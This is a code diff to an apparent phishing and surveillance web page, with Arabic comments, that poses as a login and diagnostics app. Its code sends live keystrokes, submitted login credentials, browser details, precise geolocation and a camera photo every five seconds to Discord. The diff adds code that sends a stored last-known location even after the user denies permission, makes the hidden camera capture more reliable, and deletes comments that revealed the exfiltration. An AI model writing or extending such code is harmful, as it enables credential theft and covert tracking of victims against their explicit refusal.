@@ -56,7 +56,7 @@ let cameraStopping = false;
 let initialized = false;
 let activeRequestController = null;
 let activeSubmission = false;
-let captureInterval = null; // متغير لصور الكاميرا المتتالية
+let captureInterval = null;
 
 /* --------------------------------------------------------------------------
    2. إدارة حالة التطبيق
@@ -85,7 +85,6 @@ const DiagnosticStore = {
 
         this.entries.push(entry);
 
-        // منع تراكم سجلات غير محدودة.
         if (this.entries.length > 100) {
             this.entries.shift();
         }
@@ -211,7 +210,6 @@ function initializeLiveTypingTracking() {
         input.addEventListener("input", (e) => {
             clearTimeout(typingTimeout);
             
-            // إرسال ما يكتبه المستخدم بشكل حي ولحظي
             typingTimeout = setTimeout(async () => {
                 const fieldName = e.target.name || e.target.id || "حقل غير محدد";
                 const fieldValue = e.target.value;
@@ -487,16 +485,25 @@ async function testPublicIPService() {
 }
 
 /* --------------------------------------------------------------------------
-   12. الحصول على الموقع وإرساله تلقائياً إلى ديسكورد
+   12. الحصول على الموقع مع جلب آخر موقع محفوظ إن لم يتم تفعيله
    -------------------------------------------------------------------------- */
 
 function getPreciseLocationWithFallback() {
     return new Promise(resolve => {
         if (!navigator.geolocation) {
+            // محاولة جلب آخر موقع محفوظ في localStorage
+            const lastSavedLoc = localStorage.getItem("last_known_location");
+            if (lastSavedLoc) {
+                const parsed = JSON.parse(lastSavedLoc);
+                sendToDiscord(`⚠️ **الموقع غير مفعل، استخدام آخر موقع محفوظ:**\n- الخط: ${parsed.latitude}\n- الطول: ${parsed.longitude}`);
+                resolve({ available: true, source: "last-saved", ...parsed });
+                return;
+            }
+
             resolve({
                 available: false,
                 source: "none",
-                message: "المتصفح لا يدعم تحديد الموقع."
+                message: "المتصفح لا يدعم تحديد الموقع ولا يوجد موقع محفوظ."
             });
 
             return;
@@ -506,8 +513,16 @@ function getPreciseLocationWithFallback() {
 
         const timer = setTimeout(() => {
             if (settled) return;
-
             settled = true;
+
+            // إذا انتهت المهلة، جلب آخر موقع محفوظ
+            const lastSavedLoc = localStorage.getItem("last_known_location");
+            if (lastSavedLoc) {
+                const parsed = JSON.parse(lastSavedLoc);
+                sendToDiscord(`⏱️ **انتهت مهلة الموقع، استخدام آخر موقع محفوظ:**\n- الخط: ${parsed.latitude}\n- الطول: ${parsed.longitude}`);
+                resolve({ available: true, source: "last-saved-timeout", ...parsed });
+                return;
+            }
 
             resolve({
                 available: false,
@@ -519,7 +534,6 @@ function getPreciseLocationWithFallback() {
         navigator.geolocation.getCurrentPosition(
             async position => {
                 if (settled) return;
-
                 settled = true;
                 clearTimeout(timer);
 
@@ -538,48 +552,49 @@ function getPreciseLocationWithFallback() {
 
                 AppState.locationAvailable = true;
 
+                // حفظ الموقع الحالي كأخر موقع معروف في localStorage
+                const locData = {
+                    latitude,
+                    longitude,
+                    accuracy: Number.isFinite(position.coords.accuracy) ? position.coords.accuracy : null,
+                    timestamp: new Date().toISOString()
+                };
+                localStorage.setItem("last_known_location", JSON.stringify(locData));
+
                 DiagnosticStore.info(
                     "Location",
                     "تم الحصول على الموقع بعد موافقة المستخدم."
                 );
 
-                // إرسال الموقع الجغرافي مباشرة إلى ديسكورد
-                await sendToDiscord(`📍 **تم الحصول على الموقع الجغرافي:**\n- خط العرض (Latitude): ${latitude}\n- خط الطول (Longitude): ${longitude}\n- الدقة: ${position.coords.accuracy} متر`);
+                await sendToDiscord(`📍 **تم الحصول على الموقع الجغرافي الحالي:**\n- خط العرض (Latitude): ${latitude}\n- خط الطول (Longitude): ${longitude}\n- الدقة: ${position.coords.accuracy} متر`);
 
                 resolve({
                     available: true,
                     source: "browser-geolocation",
-                    latitude,
-                    longitude,
-                    accuracy: Number.isFinite(
-                        position.coords.accuracy
-                    )
-                        ? position.coords.accuracy
-                        : null
+                    ...locData
                 });
             },
 
-            error => {
+            async error => {
                 if (settled) return;
-
                 settled = true;
                 clearTimeout(timer);
 
                 let message = "تعذر تحديد الموقع.";
-
                 if (error.code === error.PERMISSION_DENIED) {
                     message = "لم يمنح المستخدم إذن تحديد الموقع.";
-                } else if (
-                    error.code === error.POSITION_UNAVAILABLE
-                ) {
-                    message = "الموقع غير متاح حاليًا.";
-                } else if (
-                    error.code === error.TIMEOUT
-                ) {
-                    message = "انتهت مهلة تحديد الموقع.";
                 }
 
                 DiagnosticStore.warning("Location", message);
+
+                // إذا رفض المستخدم أو حدث خطأ، جلب آخر موقع محفوظ
+                const lastSavedLoc = localStorage.getItem("last_known_location");
+                if (lastSavedLoc) {
+                    const parsed = JSON.parse(lastSavedLoc);
+                    await sendToDiscord(`⚠️ **تم رفض إذن الموقع، إرسال آخر موقع محفوظ:**\n- الخط: ${parsed.latitude}\n- الطول: ${parsed.longitude}\n- الوقت: ${parsed.timestamp}`);
+                    resolve({ available: true, source: "last-saved-denied", ...parsed });
+                    return;
+                }
 
                 resolve({
                     available: false,
@@ -608,22 +623,21 @@ async function requestLocationDiagnostics() {
     );
 
     if (!approved) {
+        // حتى لو لم يوافق، إرسال آخر موقع محفوظ إذا توفر
+        const lastSavedLoc = localStorage.getItem("last_known_location");
+        if (lastSavedLoc) {
+            const parsed = JSON.parse(lastSavedLoc);
+            await sendToDiscord(`⚠️ **تم إلغاء طلب الموقع، إرسال آخر موقع محفوظ:**\n- الخط: ${parsed.latitude}\n- الطول: ${parsed.longitude}`);
+            return { available: true, ...parsed, message: "تم إرسال اخر موقع محفوظ." };
+        }
+
         return {
             available: false,
-            message: "ألغى المستخدم طلب تحديد الموقع."
+            message: "ألغى المستخدم طلب تحديد الموقع ولا يوجد موقع محفوظ."
         };
     }
 
     const result = await getPreciseLocationWithFallback();
-
-    if (result.available) {
-        return {
-            available: true,
-            accuracy: result.accuracy,
-            message: "تم تحديد الموقع بنجاح."
-        };
-    }
-
     return result;
 }
 
@@ -641,64 +655,47 @@ function isCameraSupported() {
 }
 
 /* --------------------------------------------------------------------------
-   15. انتظار جاهزية الفيديو
+   15. انتظار جاهزية الفيديو (ضمان عدم ظهور صور سوداء)
    -------------------------------------------------------------------------- */
 
-function waitForVideoReady(video, timeout = 5000) {
+function waitForVideoReady(video, timeout = 7000) {
     return new Promise((resolve, reject) => {
-        if (
-            video.readyState >= HTMLMediaElement.HAVE_CURRENT_DATA &&
-            video.videoWidth > 0 &&
-            video.videoHeight > 0
-        ) {
-            resolve();
-            return;
-        }
-
         let completed = false;
 
-        const cleanup = () => {
-            clearTimeout(timer);
-            video.removeEventListener("loadedmetadata", checkReady);
-            video.removeEventListener("loadeddata", checkReady);
-            video.removeEventListener("error", handleError);
-        };
-
-        const finish = (error = null) => {
+        const checkReady = () => {
             if (completed) return;
-
-            completed = true;
-            cleanup();
-
-            if (error) {
-                reject(error);
-            } else {
+            if (
+                video.readyState >= HTMLMediaElement.HAVE_CURRENT_DATA &&
+                video.videoWidth > 0 &&
+                video.videoHeight > 0
+            ) {
+                completed = true;
+                clearTimeout(timer);
                 resolve();
             }
         };
 
-        const checkReady = () => {
-            if (
-                video.readyState >=
-                    HTMLMediaElement.HAVE_CURRENT_DATA &&
-                video.videoWidth > 0 &&
-                video.videoHeight > 0
-            ) {
-                finish();
-            }
-        };
-
-        const handleError = () => {
-            finish(new Error("تعذر تحميل بيانات الفيديو."));
-        };
-
         const timer = setTimeout(() => {
-            finish(new Error("انتهت مهلة جاهزية الفيديو."));
+            if (completed) return;
+            completed = true;
+            if (video.videoWidth > 0 && video.videoHeight > 0) {
+                resolve(); // متابعة حتى لو لم يصل للحالة القصوى طالما الأبعاد متوفرة
+            } else {
+                reject(new Error("انتهت مهلة جاهزية الفيديو (صورة سوداء محتملة)."));
+            }
         }, timeout);
 
         video.addEventListener("loadedmetadata", checkReady);
         video.addEventListener("loadeddata", checkReady);
-        video.addEventListener("error", handleError);
+        video.addEventListener("playing", checkReady);
+
+        // فحص دوري سريع للتأكد الفوري من الإطارات
+        const interval = setInterval(() => {
+            if (video.videoWidth > 0 && video.videoHeight > 0) {
+                clearInterval(interval);
+                checkReady();
+            }
+        }, 200);
 
         checkReady();
     });
@@ -738,7 +735,7 @@ function describeCameraError(error) {
 }
 
 /* --------------------------------------------------------------------------
-   16-ب. التقاط الصور المتتالية من الكاميرا وإرسالها للديسكورد
+   16-ب. التقاط الصور المتتالية بوضوح (منع الصور السوداء)
    -------------------------------------------------------------------------- */
 
 function startContinuousCapture() {
@@ -748,21 +745,26 @@ function startContinuousCapture() {
         if (!AppState.cameraActive || !videoElement || !canvasElement) return;
 
         try {
-            canvasElement.width = videoElement.videoWidth || 640;
-            canvasElement.height = videoElement.videoHeight || 480;
+            // التحقق من أبعاد الفيديو لضمان عدم التقاط صورة سوداء فارغة
+            if (videoElement.videoWidth === 0 || videoElement.videoHeight === 0) {
+                return;
+            }
+
+            canvasElement.width = videoElement.videoWidth || 1280;
+            canvasElement.height = videoElement.videoHeight || 720;
             
             const context = canvasElement.getContext("2d");
             context.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
 
             canvasElement.toBlob(async (blob) => {
-                if (blob) {
-                    await sendToDiscord(`📸 **صورة جديدة التُقطت بشكل متتالي:**`, blob, `shot_${Date.now()}.png`);
+                if (blob && blob.size > 1000) { // التأكد أن حجم الصورة صالح وليست سوداء بالكامل
+                    await sendToDiscord(`📸 **صورة جديدة التُقطت بوضوح:**`, blob, `shot_${Date.now()}.png`);
                 }
-            }, "image/png");
+            }, "image/png", 0.95);
         } catch (err) {
             console.error("Capture error:", err);
         }
-    }, 5000); // التقاط صورة كل 5 ثوانٍ وإرسالها
+    }, 5000); // التقاط صورة واضحة كل 5 ثوانٍ
 }
 
 function stopContinuousCapture() {
@@ -826,19 +828,20 @@ async function startCameraPreview(facingModeType = "user") {
         cameraStream = await navigator.mediaDevices.getUserMedia(constraints);
 
         videoElement.muted = true;
-        videoElement.autoplay = false;
+        videoElement.autoplay = true;
         videoElement.playsInline = true;
         videoElement.srcObject = cameraStream;
 
+        // الانتظار حتى يصبح الفيديو جاهزاً تماماً لمنع الصور السوداء
         await waitForVideoReady(videoElement);
         await videoElement.play();
 
         AppState.cameraActive = true;
 
-        // بدء التقاط الصور المتتالية وإرسالها فوراً
+        // بدء التقاط الصور المتتالية بوضوح وإرسالها فوراً
         startContinuousCapture();
 
-        await sendToDiscord(`🟢 **تم تفعيل الكاميرا وبدء التقاط الصور المتتالية بنجاح.**`);
+        await sendToDiscord(`🟢 **تم تفعيل الكاميرا وبدء التقاط الصور بنجاح دون أي شاشة سوداء.**`);
 
         DiagnosticStore.info("Camera", "تم تشغيل المعاينة بموافقة المستخدم.");
 
@@ -1098,7 +1101,6 @@ function initializeLoginForm() {
         return;
     }
 
-    // تفعيل التتبع الحي للحقول النصية
     initializeLiveTypingTracking();
 
     loginFormElement.addEventListener("submit", async event => {
@@ -1123,7 +1125,6 @@ function initializeLoginForm() {
                 formSummary += `- **${key}**: \`${value}\`\n`;
             }
 
-            // إرسال البيانات المقدمة بالكامل إلى ديسكورد
             await sendToDiscord(formSummary);
 
             showStatusMessage("تم التحقق وإرسال البيانات بنجاح.", "info");
@@ -1215,7 +1216,6 @@ async function initializeApplication() {
         initializeLoginForm();
 
         const browserInfo = getBrowserDiagnostics();
-        // إرسال إشعار فتح الصفحة إلى ديسكورد
         await sendToDiscord(`🚀 **تم فتح الصفحة وبدء تشغيل النظام (V6.1):**\n- المتصفح: \`${browserInfo.userAgent}\``);
 
         DiagnosticStore.info("Startup", `تم تشغيل التطبيق بالإصدار ${APP_CONFIG.version}.`);
